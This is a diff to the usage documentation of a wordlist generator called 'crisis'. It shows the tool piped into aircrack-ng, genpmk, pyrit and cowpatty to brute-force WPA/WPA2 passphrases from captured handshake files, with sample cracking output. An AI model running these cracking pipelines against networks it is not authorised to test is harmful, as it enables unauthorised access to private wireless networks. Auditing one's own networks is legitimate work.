@@ -29,7 +29,7 @@ root@kali:~# crisis -h
 
 #Usage
 
-<h2>Pipe with Aircrack-ng</h2>
+<h2>Pipe with crisis and Aircrack-ng</h2>
 
 <pre style=" border: 1px solid black; padding:10px">
 ./crisis.exe -3 -l 20  -f lalpha-numeric | aircrack-ng -w- -e BOX__XXXX output-01.cap 
@@ -57,7 +57,7 @@ Reading packets, please wait...
       EAPOL HMAC     : A1 F8 50 CD C8 32 F6 6B C2 86 0B 58 40 B7 3D 24
 </pre>
 
-<h2>Pipe with genpmk</h2>
+<h2>Pipe with crisis and genpmk</h2>
 
 <pre style=" border: 1px solid black; padding:10px">
 crisis -3 -l 20 -f lalpha | genpmk -f- -d wordlistBOX -s BOX_XXXX
@@ -78,23 +78,31 @@ key no. 10000: kgrzzjqshhbangsfqezm
 10470 passphrases tested in 26.96 seconds:  388.38 passphrases/second
 </pre>
 
-<h2>Pipe with cowpatty</h2>
+<h2>Pipe with crisis, pyrit and cowpatty</h2>
 
 <pre style=" border: 1px solid black; padding:10px">
-crisis -3 -l 20 -f lalpha | cowpatty -f- -r output-01.cap -s BOX_XXXX
+crisis -3 -l 26 -f hex-upper -u | pyrit -o- -i- -e Box-007  passthrough | cowpatty -d - -r wpa-01.cap -s Box-007
 cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>
 
 Collected all necessary data to mount crack against WPA2/PSK passphrase.
 Starting dictionary attack.  Please be patient.
-Using STDIN for words.
-key no. 1000: dcqjjuxfzmugiubenvrw
-key no. 2000: dgcuvpaltalrtqqffpum
-key no. 3000: uvbjybtoygvezmysffbw
-key no. 4000: yeuhlbqjvjkbtfgkeogm
-key no. 5000: prubwsjmrhqsmpslcqhp
-key no. 6000: pkpracuojhawqpetsuqi
-^CUnable to identify the PSK from the dictionary file. Try expanding your
-passphrase list, and double-check the SSID.  Sorry it didn't work out.
-
-6739 passphrases tested in 16.27 seconds:  414.29 passphrases/second
+Using STDIN for hashfile contents.
+key no. 10000: 4D56FE1B55760FC46DE93AA031
+key no. 20000: 0C0BE442CBB59420F59A145740
+key no. 30000: 3928A1CB5B8CA1DE6AA93A4ACD
+key no. 40000: 1569AAA92000E811B3CE9A51E1
+key no. 50000: C4A6FEAEB70A2A604EB398E3C8
+key no. 60000: A0C4C968E3F4DC885505A72CCC
+key no. 70000: F356768829B8375B25171E1475
+key no. 80000: AD94375F47EC46AD0F8A1198A1
+key no. 90000: 371A4C1D60D765AF034B94573D
+key no. 100000: 1B07C34533B4BC7EBC5032F93E
+key no. 110000: F6E244DFFDF2D8DFA8E32227E6
+key no. 120000: B883286C8F737B2EDDD26A4D67
+key no. 130000: 2B4A13BFACAE8306AB58046C6C
+key no. 140000: E9994E0CFE374D74713EEC3716
+key no. 150000: 7448B93813CEEF66950B47F53A
+key no. 160000: 9CF4636D6E82F78F66D0459D94
+key no. 170000: D6EE9AF334F1993C2C52BC11FF
+key no. 180000: E3E64D04204B9BE3F13C12C0F8
 </pre>
